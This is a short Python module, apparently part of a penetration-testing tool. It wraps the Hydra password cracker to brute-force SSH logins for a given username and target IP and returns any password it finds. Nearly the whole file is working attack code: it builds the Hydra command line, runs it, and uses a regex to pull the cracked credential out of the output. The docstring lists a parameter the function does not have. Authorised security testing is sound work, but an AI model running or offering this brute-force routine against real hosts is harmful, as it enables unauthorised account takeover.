import subprocess
import re
import os

from typing import Optional
from app.config.crsconfig import BaseConfig as parseconfig

def get_password(username: str, target_ip: str, port: int = 22, threads: int = 4) -> Optional[str]:
    """
    Attempts to retrieve a valid password for a specified username on a target IP
    via SSH using Hydra brute-force attack.
    
    Args:
        username (str): The username to attempt login with.
        password_file (str): Path to the file containing passwords to try.
        target_ip (str): The target IP address for the SSH service.
        port (int, optional): The SSH port on the target server. Defaults to 22.
        threads (int, optional): Number of parallel connections (threads) for Hydra. Defaults to 4.
    
    Returns:
        Optional[str]: The discovered password if successful, otherwise None.
    """
    config = parseconfig()
    
    command = [
        "hydra",
        "-l", username,
        "-P", config.PASSWORD_PATH,
        "-s", str(port),
        "-t", str(threads),
        "-f",
        "-q",
        f"ssh://{target_ip}"
    ]

    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True
        )
        
        output = result.stdout
        match = re.search(rf'\[{port}\]\[ssh\] host: {re.escape(target_ip)}\s+login: {username}\s+password: (\S+)', output)
        
        if match:
            return match.group(1)
        else:
            return None

    except subprocess.CalledProcessError as e:
        return None
    except FileNotFoundError:
        return None
    except Exception as e:
        return None
